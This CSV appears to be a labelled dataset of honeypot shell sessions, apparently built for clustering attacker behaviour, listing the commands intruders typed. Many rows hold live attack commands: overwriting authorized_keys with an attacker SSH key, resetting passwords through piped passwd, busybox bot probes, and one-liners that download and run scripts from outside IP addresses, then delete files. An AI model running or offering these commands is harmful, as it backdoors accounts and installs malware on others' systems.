session,PCKmeans_exp_result,Unnamed: 0,duration,command_freq,input
a6a9b3e7bc0c,3,13142,14.30941390991211,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
a6a9b3e7bc0c,3,13144,14.30941390991211,18,ls -lh $(which ls)
a6a9b3e7bc0c,3,13145,14.30941390991211,18,which ls
a6a9b3e7bc0c,3,13147,14.30941390991211,18,crontab -l
a6a9b3e7bc0c,3,13150,14.30941390991211,18,w
a6a9b3e7bc0c,3,13152,14.30941390991211,18,uname -m
a6a9b3e7bc0c,3,13154,14.30941390991211,18,cat /proc/cpuinfo | grep model | grep name | wc -l
a6a9b3e7bc0c,3,13156,14.30941390991211,18,top
a6a9b3e7bc0c,3,13158,14.30941390991211,18,uname
a6a9b3e7bc0c,3,13160,14.30941390991211,18,uname -a
a6a9b3e7bc0c,3,13162,14.30941390991211,18,lscpu | grep Model
a6a9b3e7bc0c,3,13164,14.30941390991211,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
22d71e09a0ae,3,13131,14.021706819534302,18,cat /proc/cpuinfo | grep name | wc -l
22d71e09a0ae,3,13135,14.021706819534302,18,"echo -e ""pass\nSqLsqm0MKNh5\nSqLsqm0MKNh5""|passwd|bash"
22d71e09a0ae,3,13136,14.021706819534302,18,Enter new UNIX password: 
22d71e09a0ae,3,13137,14.021706819534302,18,Enter new UNIX password:
22d71e09a0ae,3,13141,14.021706819534302,18,"echo ""pass\nSqLsqm0MKNh5\nSqLsqm0MKNh5\n""|passwd"
22d71e09a0ae,3,13143,14.021706819534302,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
22d71e09a0ae,3,13146,14.021706819534302,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
22d71e09a0ae,3,13148,14.021706819534302,18,ls -lh $(which ls)
22d71e09a0ae,3,13149,14.021706819534302,18,which ls
22d71e09a0ae,3,13151,14.021706819534302,18,crontab -l
22d71e09a0ae,3,13153,14.021706819534302,18,w
22d71e09a0ae,3,13155,14.021706819534302,18,uname -m
22d71e09a0ae,3,13157,14.021706819534302,18,cat /proc/cpuinfo | grep model | grep name | wc -l
22d71e09a0ae,3,13159,14.021706819534302,18,top
22d71e09a0ae,3,13161,14.021706819534302,18,uname
22d71e09a0ae,3,13163,14.021706819534302,18,uname -a
22d71e09a0ae,3,13165,14.021706819534302,18,lscpu | grep Model
22d71e09a0ae,3,13166,14.021706819534302,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
ef9ef638b798,3,13167,20.94987320899964,18,cat /proc/cpuinfo | grep name | wc -l
ef9ef638b798,3,13168,20.94987320899964,18,"echo -e ""jhpark\nIJ1ibgePkCVw\nIJ1ibgePkCVw""|passwd|bash"
ef9ef638b798,3,13169,20.94987320899964,18,Enter new UNIX password: 
ef9ef638b798,3,13170,20.94987320899964,18,Enter new UNIX password:
ef9ef638b798,3,13171,20.94987320899964,18,"echo ""jhpark\nIJ1ibgePkCVw\nIJ1ibgePkCVw\n""|passwd"
ef9ef638b798,3,13172,20.94987320899964,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
ef9ef638b798,3,13173,20.94987320899964,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
ef9ef638b798,3,13174,20.94987320899964,18,ls -lh $(which ls)
ef9ef638b798,3,13175,20.94987320899964,18,which ls
ef9ef638b798,3,13176,20.94987320899964,18,crontab -l
ef9ef638b798,3,13177,20.94987320899964,18,w
ef9ef638b798,3,13178,20.94987320899964,18,uname -m
ef9ef638b798,3,13179,20.94987320899964,18,cat /proc/cpuinfo | grep model | grep name | wc -l
ef9ef638b798,3,13180,20.94987320899964,18,top
ef9ef638b798,3,13181,20.94987320899964,18,uname
ef9ef638b798,3,13182,20.94987320899964,18,uname -a
ef9ef638b798,3,13183,20.94987320899964,18,lscpu | grep Model
ef9ef638b798,3,13184,20.94987320899964,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
27b5263e160e,1,13185,0.359866380691528,1,nproc; uname -a
4b1115f140d9,3,13186,14.537930250167848,18,cat /proc/cpuinfo | grep name | wc -l
4b1115f140d9,3,13187,14.537930250167848,18,"echo -e ""boss123\nq91X9FSUuDz0\nq91X9FSUuDz0""|passwd|bash"
4b1115f140d9,3,13188,14.537930250167848,18,Enter new UNIX password: 
4b1115f140d9,3,13189,14.537930250167848,18,Enter new UNIX password:
4b1115f140d9,3,13190,14.537930250167848,18,"echo ""boss123\nq91X9FSUuDz0\nq91X9FSUuDz0\n""|passwd"
4b1115f140d9,3,13191,14.537930250167848,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4b1115f140d9,3,13192,14.537930250167848,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4b1115f140d9,3,13193,14.537930250167848,18,ls -lh $(which ls)
4b1115f140d9,3,13194,14.537930250167848,18,which ls
4b1115f140d9,3,13195,14.537930250167848,18,crontab -l
4b1115f140d9,3,13196,14.537930250167848,18,w
4b1115f140d9,3,13197,14.537930250167848,18,uname -m
4b1115f140d9,3,13198,14.537930250167848,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4b1115f140d9,3,13199,14.537930250167848,18,top
4b1115f140d9,3,13200,14.537930250167848,18,uname
4b1115f140d9,3,13201,14.537930250167848,18,uname -a
4b1115f140d9,3,13202,14.537930250167848,18,lscpu | grep Model
4b1115f140d9,3,13203,14.537930250167848,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
4c3c046108ce,3,13204,14.670921087265016,18,cat /proc/cpuinfo | grep name | wc -l
4c3c046108ce,3,13205,14.670921087265016,18,"echo -e ""weblogicpass\nKblxDNBtYROJ\nKblxDNBtYROJ""|passwd|bash"
4c3c046108ce,3,13206,14.670921087265016,18,Enter new UNIX password: 
4c3c046108ce,3,13207,14.670921087265016,18,Enter new UNIX password:
4c3c046108ce,3,13208,14.670921087265016,18,"echo ""weblogicpass\nKblxDNBtYROJ\nKblxDNBtYROJ\n""|passwd"
4c3c046108ce,3,13209,14.670921087265016,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4c3c046108ce,3,13210,14.670921087265016,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4c3c046108ce,3,13211,14.670921087265016,18,ls -lh $(which ls)
4c3c046108ce,3,13212,14.670921087265016,18,which ls
4c3c046108ce,3,13213,14.670921087265016,18,crontab -l
4c3c046108ce,3,13214,14.670921087265016,18,w
4c3c046108ce,3,13215,14.670921087265016,18,uname -m
4c3c046108ce,3,13216,14.670921087265016,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4c3c046108ce,3,13217,14.670921087265016,18,top
4c3c046108ce,3,13218,14.670921087265016,18,uname
4c3c046108ce,3,13219,14.670921087265016,18,uname -a
4c3c046108ce,3,13220,14.670921087265016,18,lscpu | grep Model
4c3c046108ce,3,13221,14.670921087265016,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
bbdf54f28317,0,13222,60.304624795913696,1,yum install wget -y; apt install wget -y; cd /tmp; rm -rf x86.sh; wget http://2.56.56.182/x86.sh; chmod 777 *; sh x86.sh
67831794de52,0,13223,60.19273638725281,1,yum install wget -y; apt install wget -y; cd /tmp; rm -rf x86.sh; wget http://2.56.56.182/x86.sh; chmod 777 *; sh x86.sh
0f328a61b84d,0,13224,60.24381875991821,1,yum install wget -y; apt install wget -y; cd /tmp; rm -rf x86.sh; wget http://2.56.56.182/x86.sh; chmod 777 *; sh x86.sh
8034d1a25afd,2,13225,6.159282445907593,13,enable
8034d1a25afd,2,13226,6.159282445907593,13,system
8034d1a25afd,2,13227,6.159282445907593,13,system
8034d1a25afd,2,13228,6.159282445907593,13,shell
8034d1a25afd,2,13229,6.159282445907593,13,shell
8034d1a25afd,2,13230,6.159282445907593,13,sh
8034d1a25afd,2,13231,6.159282445907593,13,cat /proc/mounts; /bin/busybox ARGJY
8034d1a25afd,2,13232,6.159282445907593,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ARGJY
8034d1a25afd,2,13233,6.159282445907593,13,tftp; wget; /bin/busybox ARGJY
8034d1a25afd,2,13234,6.159282445907593,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
8034d1a25afd,2,13235,6.159282445907593,13,while read i
8034d1a25afd,2,13236,6.159282445907593,13,/bin/busybox ARGJY
8034d1a25afd,2,13237,6.159282445907593,13,rm .s; exit
4e9648bba14a,3,13238,70.83246374130249,18,cat /proc/cpuinfo | grep name | wc -l
4e9648bba14a,3,13239,70.83246374130249,18,"echo -e ""liuyang\npXhSdhrU8I2V\npXhSdhrU8I2V""|passwd|bash"
4e9648bba14a,3,13240,70.83246374130249,18,Enter new UNIX password: 
4e9648bba14a,3,13241,70.83246374130249,18,Enter new UNIX password:
4e9648bba14a,3,13242,70.83246374130249,18,"echo ""liuyang\npXhSdhrU8I2V\npXhSdhrU8I2V\n""|passwd"
4e9648bba14a,3,13243,70.83246374130249,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
4e9648bba14a,3,13244,70.83246374130249,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
4e9648bba14a,3,13245,70.83246374130249,18,ls -lh $(which ls)
4e9648bba14a,3,13246,70.83246374130249,18,which ls
4e9648bba14a,3,13247,70.83246374130249,18,crontab -l
4e9648bba14a,3,13248,70.83246374130249,18,w
4e9648bba14a,3,13249,70.83246374130249,18,uname -m
4e9648bba14a,3,13250,70.83246374130249,18,cat /proc/cpuinfo | grep model | grep name | wc -l
4e9648bba14a,3,13251,70.83246374130249,18,top
4e9648bba14a,3,13252,70.83246374130249,18,uname
4e9648bba14a,3,13253,70.83246374130249,18,uname -a
4e9648bba14a,3,13254,70.83246374130249,18,lscpu | grep Model
4e9648bba14a,3,13255,70.83246374130249,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
52866122ce9a,3,13256,70.48638772964478,18,cat /proc/cpuinfo | grep name | wc -l
52866122ce9a,3,13257,70.48638772964478,18,"echo -e ""test\nf4Mga7E0I2SV\nf4Mga7E0I2SV""|passwd|bash"
52866122ce9a,3,13258,70.48638772964478,18,Enter new UNIX password: 
52866122ce9a,3,13259,70.48638772964478,18,Enter new UNIX password:
52866122ce9a,3,13260,70.48638772964478,18,"echo ""test\nf4Mga7E0I2SV\nf4Mga7E0I2SV\n""|passwd"
52866122ce9a,3,13261,70.48638772964478,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
52866122ce9a,3,13262,70.48638772964478,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
52866122ce9a,3,13263,70.48638772964478,18,ls -lh $(which ls)
52866122ce9a,3,13264,70.48638772964478,18,which ls
52866122ce9a,3,13265,70.48638772964478,18,crontab -l
52866122ce9a,3,13266,70.48638772964478,18,w
52866122ce9a,3,13267,70.48638772964478,18,uname -m
52866122ce9a,3,13268,70.48638772964478,18,cat /proc/cpuinfo | grep model | grep name | wc -l
52866122ce9a,3,13269,70.48638772964478,18,top
52866122ce9a,3,13270,70.48638772964478,18,uname
52866122ce9a,3,13271,70.48638772964478,18,uname -a
52866122ce9a,3,13272,70.48638772964478,18,lscpu | grep Model
52866122ce9a,3,13273,70.48638772964478,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
d256405e8c07,2,13274,1.243726015090942,13,enable
d256405e8c07,2,13275,1.243726015090942,13,system
d256405e8c07,2,13276,1.243726015090942,13,system
d256405e8c07,2,13277,1.243726015090942,13,shell
d256405e8c07,2,13278,1.243726015090942,13,shell
d256405e8c07,2,13279,1.243726015090942,13,sh
d256405e8c07,2,13280,1.243726015090942,13,cat /proc/mounts; /bin/busybox WZJZN
d256405e8c07,2,13281,1.243726015090942,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WZJZN
d256405e8c07,2,13282,1.243726015090942,13,tftp; wget; /bin/busybox WZJZN
d256405e8c07,2,13283,1.243726015090942,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d256405e8c07,2,13284,1.243726015090942,13,while read i
d256405e8c07,2,13285,1.243726015090942,13,/bin/busybox WZJZN
d256405e8c07,2,13286,1.243726015090942,13,rm .s; exit
0e79112ed6d6,3,13287,61.0032811164856,18,cat /proc/cpuinfo | grep name | wc -l
0e79112ed6d6,3,13288,61.0032811164856,18,"echo -e ""12345\nYIxpft8Glmrn\nYIxpft8Glmrn""|passwd|bash"
0e79112ed6d6,3,13289,61.0032811164856,18,Enter new UNIX password: 
0e79112ed6d6,3,13290,61.0032811164856,18,Enter new UNIX password:
0e79112ed6d6,3,13291,61.0032811164856,18,"echo ""12345\nYIxpft8Glmrn\nYIxpft8Glmrn\n""|passwd"
0e79112ed6d6,3,13292,61.0032811164856,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
0e79112ed6d6,3,13293,61.0032811164856,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
0e79112ed6d6,3,13294,61.0032811164856,18,ls -lh $(which ls)
0e79112ed6d6,3,13295,61.0032811164856,18,which ls
0e79112ed6d6,3,13296,61.0032811164856,18,crontab -l
0e79112ed6d6,3,13297,61.0032811164856,18,w
0e79112ed6d6,3,13298,61.0032811164856,18,uname -m
0e79112ed6d6,3,13299,61.0032811164856,18,cat /proc/cpuinfo | grep model | grep name | wc -l
0e79112ed6d6,3,13300,61.0032811164856,18,top
0e79112ed6d6,3,13301,61.0032811164856,18,uname
0e79112ed6d6,3,13302,61.0032811164856,18,uname -a
0e79112ed6d6,3,13303,61.0032811164856,18,lscpu | grep Model
0e79112ed6d6,3,13304,61.0032811164856,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
2858da4c28b4,2,13305,1.585030555725097,13,enable
2858da4c28b4,2,13306,1.585030555725097,13,system
2858da4c28b4,2,13307,1.585030555725097,13,system
2858da4c28b4,2,13308,1.585030555725097,13,shell
2858da4c28b4,2,13309,1.585030555725097,13,shell
2858da4c28b4,2,13310,1.585030555725097,13,sh
2858da4c28b4,2,13311,1.585030555725097,13,cat /proc/mounts; /bin/busybox NYCPH
2858da4c28b4,2,13312,1.585030555725097,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NYCPH
2858da4c28b4,2,13313,1.585030555725097,13,tftp; wget; /bin/busybox NYCPH
2858da4c28b4,2,13314,1.585030555725097,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
2858da4c28b4,2,13315,1.585030555725097,13,while read i
2858da4c28b4,2,13316,1.585030555725097,13,/bin/busybox NYCPH
2858da4c28b4,2,13317,1.585030555725097,13,rm .s; exit
3b9caa6cfb51,0,13318,30.55149245262146,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.235.203/0x83911d24Fx.sh; curl -O http://213.232.235.203/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp 157.230.119.179 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 157.230.119.179 ; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 157.230.119.179 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *
b82f8c8f6682,0,13319,30.4933021068573,1,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://213.232.235.203/0x83911d24Fx.sh; curl -O http://213.232.235.203/0x83911d24Fx.sh; chmod 777 0x83911d24Fx.sh; sh 0x83911d24Fx.sh; tftp 157.230.119.179 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 157.230.119.179 ; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 157.230.119.179 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *
009dc2f75c3b,3,13320,14.013844013214111,18,cat /proc/cpuinfo | grep name | wc -l
009dc2f75c3b,3,13321,14.013844013214111,18,"echo -e ""riki\nHH5bNShpxGzF\nHH5bNShpxGzF""|passwd|bash"
009dc2f75c3b,3,13322,14.013844013214111,18,Enter new UNIX password: 
009dc2f75c3b,3,13323,14.013844013214111,18,Enter new UNIX password:
009dc2f75c3b,3,13324,14.013844013214111,18,"echo ""riki\nHH5bNShpxGzF\nHH5bNShpxGzF\n""|passwd"
009dc2f75c3b,3,13325,14.013844013214111,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
009dc2f75c3b,3,13326,14.013844013214111,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
009dc2f75c3b,3,13327,14.013844013214111,18,ls -lh $(which ls)
009dc2f75c3b,3,13328,14.013844013214111,18,which ls
009dc2f75c3b,3,13329,14.013844013214111,18,crontab -l
009dc2f75c3b,3,13330,14.013844013214111,18,w
009dc2f75c3b,3,13331,14.013844013214111,18,uname -m
009dc2f75c3b,3,13332,14.013844013214111,18,cat /proc/cpuinfo | grep model | grep name | wc -l
009dc2f75c3b,3,13333,14.013844013214111,18,top
009dc2f75c3b,3,13334,14.013844013214111,18,uname
009dc2f75c3b,3,13335,14.013844013214111,18,uname -a
009dc2f75c3b,3,13336,14.013844013214111,18,lscpu | grep Model
009dc2f75c3b,3,13337,14.013844013214111,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
c71fe295739f,3,13338,14.558450937271118,18,cat /proc/cpuinfo | grep name | wc -l
c71fe295739f,3,13339,14.558450937271118,18,"echo -e ""arma\n0fv7NmNUkMjE\n0fv7NmNUkMjE""|passwd|bash"
c71fe295739f,3,13340,14.558450937271118,18,Enter new UNIX password: 
c71fe295739f,3,13341,14.558450937271118,18,Enter new UNIX password:
c71fe295739f,3,13342,14.558450937271118,18,"echo ""arma\n0fv7NmNUkMjE\n0fv7NmNUkMjE\n""|passwd"
c71fe295739f,3,13343,14.558450937271118,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
c71fe295739f,3,13344,14.558450937271118,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
c71fe295739f,3,13345,14.558450937271118,18,ls -lh $(which ls)
c71fe295739f,3,13346,14.558450937271118,18,which ls
c71fe295739f,3,13347,14.558450937271118,18,crontab -l
c71fe295739f,3,13348,14.558450937271118,18,w
c71fe295739f,3,13349,14.558450937271118,18,uname -m
c71fe295739f,3,13350,14.558450937271118,18,cat /proc/cpuinfo | grep model | grep name | wc -l
c71fe295739f,3,13351,14.558450937271118,18,top
c71fe295739f,3,13352,14.558450937271118,18,uname
c71fe295739f,3,13353,14.558450937271118,18,uname -a
c71fe295739f,3,13354,14.558450937271118,18,lscpu | grep Model
c71fe295739f,3,13355,14.558450937271118,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
66a836459b3d,3,13356,16.68023920059204,18,cat /proc/cpuinfo | grep name | wc -l
66a836459b3d,3,13357,16.68023920059204,18,"echo -e ""yms\n89DOwgBcXach\n89DOwgBcXach""|passwd|bash"
